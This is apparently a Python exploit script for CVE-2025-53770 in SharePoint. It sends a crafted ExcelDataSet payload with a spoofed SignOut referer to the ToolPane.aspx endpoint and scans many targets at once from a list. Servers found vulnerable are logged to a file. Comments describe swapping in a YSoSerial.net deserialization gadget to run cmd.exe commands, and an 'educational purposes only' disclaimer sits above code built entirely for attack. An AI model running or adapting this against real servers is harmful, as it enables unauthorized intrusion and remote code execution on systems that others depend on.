import asyncio,aiohttp,base64,zlib,re,sys,os # type: ignore
__author__="J4ck3LSyN"
# NOTE: This PoC is for educational and testing purposes only. Do not use it on systems you do not have explicit permission to test. Always adhere to ethical guidelines and legal requirements when conducting security assessments.
checkStr="CVE-2025-53770-Validator"
def buildXml(cmd=None):
    # Static check blob for verification
    payload="H4sICGM0m2gAA215cGF5bG9hZC54bWwAhZJRa8MgFIXf9yuC79Y0XdchSR5a+jDY2ENDN/YSbqOpsqhB7dL++7kkbccYFATleu93Dh5TJut6b+mwgYqOqtGOKsfAQ4YOVlNXCa7AYSUra5ypPa6MoqEPD11onBkQt2bOQvhrivK7KEprY372cNqBjUY7kmWogF3DUTSIUGu6V8t44Mfo3CXArQToPXcZktpx6zlDAyzgWlONzo5OZkh431JCuq6bdLOJsXuSxPGUvL88b3qzOBA86IqjyxS7PXWRC4IFd/7NQttye62G+pOuTb4RYHlrpPblarvGSZzM8Xy2WMTl9tBobmEnG+lP5Urw6nNty+WpXHKhQW1BM0hJD/lNLaQKeqDavGfFi7CK2QOdPtL75CMl1/urQ/KPxZSEhxoTICGCPhTSp5KSP78jv/sGCOrM8zACAAA="
    if cmd:
        # In a production Red Team scenario, replace this with a base64 encoded 
        # YSoSerial.net output (e.g., ObjectDataProvider calling cmd.exe /c)
        print(f"[*] Tasking: Command Execution -> '{cmd}'")
        # payload = generateGadget(cmd) 

    return f"""<%@ Register Tagprefix="Scorecard" Namespace="Microsoft.PerformancePoint.Scorecards" Assembly="Microsoft.PerformancePoint.Scorecards.Client, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c" %>
<%@ Register Tagprefix="asp" Namespace="System.Web.UI" Assembly="System.Web.Extensions, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" %>
<asp:UpdateProgress ID="UpdateProgress1" DisplayAfter="10" runat="server" AssociatedUpdatePanelID="upTest">
  <ProgressTemplate>
    <div class="divWaiting">
      <Scorecard:ExcelDataSet CompressedDataTable="{payload}" DataTable-CaseSensitive="false" runat="server"></Scorecard:ExcelDataSet>
    </div>
  </ProgressTemplate>
</asp:UpdateProgress>"""

async def runTask(session,target,cmd):
    target=target if target.startswith("http") else f"https://{target}"
    url=f"{target.rstrip('/')}/_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx";headers={"Referer":"/_layouts/SignOut.aspx","Content-Type":"application/x-www-form-urlencoded"};data={"MSOTlPn_Uri":target,"MSOTlPn_DWP":buildXml(cmd)}
    try:
        async with session.post(url,headers=headers,data=data,ssl=False,timeout=10) as r:
            res=await r.text()
            if not cmd:
                m=re.search(r'CompressedDataTable=&quot;([^&]+)',res)
                if m and checkStr.encode() in zlib.decompress(base64.b64decode(m.group(1)),16+zlib.MAX_WBITS):
                    print(f"[!] VULNERABLE: {target}")
                    with open("vuln.lst","a") as f: f.write(f"{target}\n")
                else: print(f"[-] SAFE: {target}")
            else: print(f"[*] EXPLOIT SENT: {target} (HTTP {r.status})")
    except Exception as e: print(f"[?] ERROR: {target} -> {str(e)[:50]}")

async def main():
    if len(sys.argv)<2: print("Usage: python3 sploit.py <target|file.txt> <cmd(opt)>");sys.exit(1)
    raw,cmd=sys.argv[1],sys.argv[2] if len(sys.argv)>2 else None
    targets=[raw] if not os.path.isfile(raw) else [l.strip() for l in open(raw) if l.strip()]
    async with aiohttp.ClientSession() as s:
        await asyncio.gather(*[runTask(s,t,cmd) for t in targets])

if __name__=="__main__": asyncio.run(main())
